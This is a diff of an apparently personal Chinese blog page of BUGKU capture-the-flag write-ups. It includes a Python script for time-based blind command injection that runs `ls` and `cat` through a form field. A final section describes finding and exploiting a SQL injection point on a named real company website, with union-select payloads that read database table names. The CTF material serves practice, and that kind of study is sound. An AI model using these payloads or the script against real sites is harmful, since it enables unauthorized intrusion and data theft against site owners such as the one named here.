@@ -77,20 +77,21 @@
 
 
 
-<meta name="description" content="BUGKUlogin2(SKCTF)进入后出现登录界面，首先尝试用万能密码登录无果； 抓包发现响应包里有tip">
+<meta name="description" content="BUGKU">
 <meta name="keywords" content="ctf">
 <meta property="og:type" content="article">
 <meta property="og:title" content="BUGKU">
 <meta property="og:url" content="http://www.mr-guo.xin/2018/09/29/BUGKU/index.html">
 <meta property="og:site_name" content="super&#x2F;guo">
-<meta property="og:description" content="BUGKUlogin2(SKCTF)进入后出现登录界面，首先尝试用万能密码登录无果； 抓包发现响应包里有tip">
+<meta property="og:description" content="BUGKU">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://www.mr-guo.xin/2018/09/29/BUGKU/10-03/never01.png">
 <meta property="og:image" content="http://www.mr-guo.xin/2018/09/29/BUGKU/10-03/login2.png">
-<meta property="og:updated_time" content="2018-10-03T06:42:20.026Z">
+<meta property="og:updated_time" content="2018-10-04T04:37:32.458Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="BUGKU">
-<meta name="twitter:description" content="BUGKUlogin2(SKCTF)进入后出现登录界面，首先尝试用万能密码登录无果； 抓包发现响应包里有tip">
-<meta name="twitter:image" content="http://www.mr-guo.xin/2018/09/29/BUGKU/10-03/login2.png">
+<meta name="twitter:description" content="BUGKU">
+<meta name="twitter:image" content="http://www.mr-guo.xin/2018/09/29/BUGKU/10-03/never01.png">
 
 
 
@@ -380,7 +381,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  407
+                  694
                 </span>
               
 
@@ -396,7 +397,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  2
+                  3
                 </span>
               
             </div>
@@ -417,10 +418,16 @@
       
 
       
-        <h2 id="BUGKU"><a href="#BUGKU" class="headerlink" title="BUGKU"></a>BUGKU</h2><h3 id="login2-SKCTF"><a href="#login2-SKCTF" class="headerlink" title="login2(SKCTF)"></a>login2(SKCTF)</h3><pre><code>进入后出现登录界面，首先尝试用万能密码登录无果；
+        <h2 id="BUGKU"><a href="#BUGKU" class="headerlink" title="BUGKU"></a>BUGKU</h2><a id="more"></a>
+<h3 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h3><pre><code>查看源码提示需要post参数margin带查找到的值，抓包发现flag参数
+</code></pre><h3 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h3><pre><code>进入发现页面只有一句话，查看源代码发现1p.html，访问发现页面出现跳转，抓包查看发现大段字符串
+</code></pre><p><img src="/2018/09/29/BUGKU/10-03/never01.png" alt=""></p>
+<pre><code>先base64解码，再url解码发现php代码段
+</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">";if(!<span class="variable">$_GET</span>['id'])</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    header('Location: hello.php?id=1');</span></span><br><span class="line"><span class="string">    exit();</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  <span class="variable">$id</span>=<span class="variable">$_GET</span>['id'];</span></span><br><span class="line"><span class="string">  <span class="variable">$a</span>=<span class="variable">$_GET</span>['a'];</span></span><br><span class="line"><span class="string">  <span class="variable">$b</span>=<span class="variable">$_GET</span>['b'];</span></span><br><span class="line"><span class="string">  if(stripos(<span class="variable">$a</span>,'.'))</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    echo 'no no no no no no no';</span></span><br><span class="line"><span class="string">    return ;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  <span class="variable">$data</span> = @file_get_contents(<span class="variable">$a</span>,'r');</span></span><br><span class="line"><span class="string">  if(<span class="variable">$data</span>=="</span>bugku is a nice plateform!<span class="string">" and <span class="variable">$id</span>==0 and strlen(<span class="variable">$b</span>)&gt;5 and eregi("</span>111<span class="string">".substr(<span class="variable">$b</span>,0,1),"</span>1114<span class="string">") and substr(<span class="variable">$b</span>,0,1)!=4)</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    require("</span>f4l2a3g.txt<span class="string">");</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    print "</span>never never never give up !!!<span class="string">";</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code>这题有个bug直接访问文件就可以得到flag
+</code></pre><h3 id="login2-SKCTF"><a href="#login2-SKCTF" class="headerlink" title="login2(SKCTF)"></a>login2(SKCTF)</h3><pre><code>进入后出现登录界面，首先尝试用万能密码登录无果；
 抓包发现响应包里有tip
 </code></pre><p><img src="/2018/09/29/BUGKU/10-03/login2.png" alt=""></p>
-<a id="more"></a>
 <p>base64解码</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT username,password FROM admin WHERE username='"</span>.<span class="variable">$username</span>.<span class="string">"'"</span>;</span><br><span class="line"><span class="keyword">if</span> (!empty(<span class="variable">$row</span>) &amp;&amp; <span class="variable">$row</span>[<span class="string">'password'</span>]===md5(<span class="variable">$password</span>))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <pre><code>登录的流程为：
@@ -439,6 +446,11 @@
 
 这里自己用python写了个脚本，贴上代码（本人是新手，写的比较粗糙）,首先跑出目录，会发现有flag字样的txt文件，在用脚本读取出文件内容发现flag
 </code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">stri=<span class="string">'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;[]|\/+-*.0123456789!@#$%^&amp;*()=_&lt;&gt;, '</span></span><br><span class="line">url=<span class="string">'http://123.206.31.85:49165/index.php'</span></span><br><span class="line">data_post= &#123;<span class="string">'c'</span>:<span class="string">'c=123;a=`ls`;b="s";if [ $&#123;a:1:1&#125; == $b ];then sleep 2;fi'</span>&#125;</span><br><span class="line">cookies=&#123;<span class="string">'PHPSESSID'</span>:<span class="string">'hbccmcbln7ul8lc0hgh2q9rrg4'</span>&#125;</span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(0,50):</span><br><span class="line">  <span class="keyword">for</span> y <span class="keyword">in</span> stri:</span><br><span class="line">    <span class="comment"># 查看目录</span></span><br><span class="line">    data_post[<span class="string">'c'</span>] = <span class="string">"c=123;a=`ls`;b=\""</span> + y + <span class="string">"\";if [ <span class="variable">$&#123;a:" + str(x) + ":1&#125;</span> == <span class="variable">$b</span> ];then sleep 2;fi"</span> </span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># 查看文件内容</span></span><br><span class="line">    <span class="comment">#data_post['c'] = "c=123;a=`cat xx`;b=\"" + y + "\";if [ $&#123;a:" + str(x) + ":1&#125; == $b ];then sleep 2;fi"</span></span><br><span class="line">    <span class="built_in">print</span>(data_post)</span><br><span class="line">    r = requests.post(url,data=data_post,cookies=cookies)</span><br><span class="line">    time = r.elapsed.seconds</span><br><span class="line">    <span class="keyword">if</span> time&gt;1:</span><br><span class="line">      result += y</span><br><span class="line">      <span class="built_in">break</span></span><br><span class="line">  <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+<h3 id="实战2-注入"><a href="#实战2-注入" class="headerlink" title="实战2-注入"></a>实战2-注入</h3><pre><code>转了一会发现about菜单的news界面可能存在注入点，访问http://www.kabelindo.co.id/readnews.php?id=25 and 1=2发现页面返回异常确认注入点。
+payload：
+    ?id=25 order by 5  //确认列数 
+    ?id=125 union select 1,substr((group_concat(table_name)),100,150),3,4,5 from information_schema.tables where table_schema=database() //获取最后一个表名提交
+</code></pre>
       
     </div>
     
@@ -628,7 +640,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#BUGKU"><span class="nav-text">BUGKU</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#login2-SKCTF"><span class="nav-text">login2(SKCTF)</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#BUGKU"><span class="nav-text">BUGKU</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#速度要快"><span class="nav-text">速度要快</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#never-give-up"><span class="nav-text">never give up</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#login2-SKCTF"><span class="nav-text">login2(SKCTF)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实战2-注入"><span class="nav-text">实战2-注入</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -680,7 +692,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共3.2k字</span>
+  <span class="post-count">博客全站共3.5k字</span>
 </div>
         
 
